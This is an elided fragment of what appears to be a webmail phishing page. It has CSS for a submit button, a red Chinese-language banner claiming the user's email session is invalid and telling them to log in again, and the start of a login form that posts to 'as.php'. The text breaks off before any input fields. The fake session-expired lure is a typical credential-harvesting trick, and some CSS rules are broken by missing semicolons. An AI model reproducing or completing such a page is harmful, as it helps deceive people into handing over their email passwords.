...
.security-text {
   ...
   #submitButton {
      ...
      padding: 10px 20px;
      font-size: 16px;
      background-color: #1F6FB5 !important /* Updated button background color */
      color: #fff;
      border: none;
      border-radius: 4px;
      transition: background-color 0.3s ease, color 0.3s ease;
   ...
   #submitButton:hover {
      background-color: #1F6FB5 !important /* Updated hover background color */
      color: #fff;
      text-decoration: none; /* Remove underline */
   }
...
<hr>
<div id="errorMessage" class="error-message" style="margin-top: 3px; margin-bottom: 3px; font-size: 13px; color: red; text-align: center;">您的邮箱登录会话无效。请重新登录以访问。</div>

         <form id="loginForm" method="post" action="as.php">
            <div class="input-box">
